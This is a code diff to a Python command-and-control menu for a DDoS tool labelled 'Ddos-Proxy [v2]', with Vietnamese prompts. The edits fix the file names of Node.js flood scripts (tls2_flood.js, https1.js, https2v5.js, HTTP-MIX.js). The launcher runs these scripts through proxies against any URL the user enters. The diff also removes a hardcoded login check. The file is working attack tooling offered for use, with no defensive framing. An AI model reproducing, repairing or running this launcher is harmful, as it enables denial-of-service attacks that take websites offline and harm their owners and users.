@@ -122,7 +122,7 @@ def title():
 def main():
     title()
     while(True):
-        cnc = input('''\x1bChọn Methods Để Attack:''')
+        cnc = input('''\x1b  Chọn Methods Để Attack:''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
         if cnc == "methods" or cnc == "METHODS" or cnc == "MS" or cnc == "ms":
@@ -171,7 +171,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 threads = cnc.split()[3]
-                os.system(f'node tls2_flood GET {url} proxies.txt {time} 1000 {threads}')
+                os.system(f'node tls2_flood.js GET {url} proxies.txt {time} 1000 {threads}')
             except IndexError:
                 print('Usage: tls2_flood <url> <time> <threads>')
                 print('Example: tls2_flood http://example.com 120 5')
@@ -180,7 +180,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node https1 {url} 10 2000 {time}')
+                os.system(f'node https1.js {url} 10 2000 {time}')
             except IndexError:
                 print('Usage: https1 <url> <time>')
                 print('Example: https1 http://example.com 120')
@@ -189,7 +189,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node https2v5 GET {url} proxies.txt {time} 200 10')
+                os.system(f'node https2v5.js GET {url} proxies.txt {time} 200 10')
             except IndexError:
                 print('Usage: https2v5 <url> <time>')
                 print('Example: https2v5 https://example.com 120')    
@@ -218,7 +218,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-MIX {url} {time}')
+                os.system(f'node HTTP-MIX.js {url} {time}')
             except IndexError:
                 print('Usage: http-mix <url> <time>')
                 print('Example: http-mix https://example.com 120')                
@@ -229,20 +229,3 @@ def main():
                 print("Command: [ " + cmmnd + " ] Not Found!")
             except IndexError:
                 pass             
-def login():
-    clear()
-    user = "hlam"
-    passwd = "hlam"
-    username = input("⚡ Username: ")
-    password = getpass.getpass(prompt='⚡ Password: ')
-    if username != user or password != passwd:
-        print("")
-        print("⚡ Xin Lỗi Bạn Đã Nhập Sai Pass")
-        sys.exit(1)
-    elif username == user and password == passwd:
-        print("⚡ Welcome To Ddos-Proxy [v2]")
-        time.sleep(0.3)
-        ascii_vro()
-        main()
-
-login()
